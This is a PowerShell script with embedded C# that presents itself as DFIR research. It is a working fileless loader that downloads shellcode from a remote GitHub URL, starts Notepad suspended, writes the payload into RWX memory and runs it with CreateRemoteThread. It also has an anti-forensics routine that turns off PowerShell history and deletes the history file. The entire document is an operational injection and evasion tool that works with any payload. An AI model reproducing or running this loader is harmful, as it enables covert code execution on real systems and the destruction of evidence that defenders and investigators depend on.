<#
    PROJECT: Fileless Process Hollowing (Donut Shellcode Edition)
    PURPOSE: DFIR Research - Injecting 64-bit AutoClicker into 64-bit Notepad
    AUTHOR: [Your Name]
#>

# --- CONFIGURATION ---
# [IMPORTANT] Replace with your RAW GitHub URL
$PayloadUrl = "https://raw.githubusercontent.com/stumbs/NotePadInjection/main/payload.bin"


# --- PART 1: THE C# LOADER ---
$Code = @"
using System;
using System.Runtime.InteropServices;
using System.Net;

public class FilelessLoader {
    
    // --- Windows API Imports ---
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CreateProcess(
        string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, 
        IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, 
        IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, 
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(
        IntPtr hProcess, IntPtr lpAddress, uint dwSize, 
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, 
        uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateRemoteThread(
        IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, 
        IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint ResumeThread(IntPtr hThread);

    // --- Structures ---
    
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public uint cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION { 
        public IntPtr hProcess; 
        public IntPtr hThread; 
        public int dwProcessId; 
        public int dwThreadId; 
    }

    // --- Execution Logic ---
    public static void Execute(string url) {
        try {
            Console.WriteLine("[*] Fetching 64-bit Payload from GitHub...");
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            WebClient wc = new WebClient();
            byte[] shellcode = wc.DownloadData(url);
            
            if (shellcode.Length == 0) { Console.WriteLine("[-] Failed to download."); return; }

            Console.WriteLine("[*] Spawning 64-bit Notepad (Suspended)...");
            
            STARTUPINFO si = new STARTUPINFO();
            si.cb = (uint)Marshal.SizeOf(si);
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            
            // TARGET: System32 (64-bit) to match your 64-bit AutoClicker
            bool success = CreateProcess(@"C:\Windows\System32\notepad.exe", null, 
                IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
            
            if (!success) { Console.WriteLine("[-] CreateProcess failed."); return; }

            Console.WriteLine("[*] Allocating Memory (RWX)...");
            IntPtr remoteMem = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);

            Console.WriteLine("[*] Writing Payload...");
            IntPtr bytesWritten;
            WriteProcessMemory(pi.hProcess, remoteMem, shellcode, (uint)shellcode.Length, out bytesWritten);

            Console.WriteLine("[*] Executing Payload...");
            // Run the payload in a new thread
            CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, remoteMem, IntPtr.Zero, 0, IntPtr.Zero);
            
            // Resume the main thread so the process is 'alive' enough for the GUI
            ResumeThread(pi.hThread);
            
            Console.WriteLine("[+] Injection Success. Check for the AutoClicker window!");
        }
        catch (Exception e) {
            Console.WriteLine("[-] Error: " + e.Message);
        }
    }
}
"@

# --- PART 2: ANTI-FORENSICS ---
function Invoke-StealthCleanup {
    Write-Host "`n[*] Cleaning Evidence..." -ForegroundColor Yellow
    Set-PSReadlineOption -HistorySaveStyle SaveNothing
    $HistoryPath = (Get-PSReadlineOption).HistorySavePath
    if (Test-Path $HistoryPath) {
        Remove-Item -Path $HistoryPath -Force -ErrorAction SilentlyContinue
        Write-Host "[+] History File Wiped." -ForegroundColor Green
    }
}

# --- PART 3: LAUNCH ---
Write-Host "[*] Compiling Engine..." -ForegroundColor Cyan
Add-Type -TypeDefinition $Code -Language CSharp

# Run
[FilelessLoader]::Execute($PayloadUrl)

# Clean
Invoke-StealthCleanup

Write-Host "`n[!] Operation Complete." -ForegroundColor Cyan
Read-Host "Press ENTER to exit..."
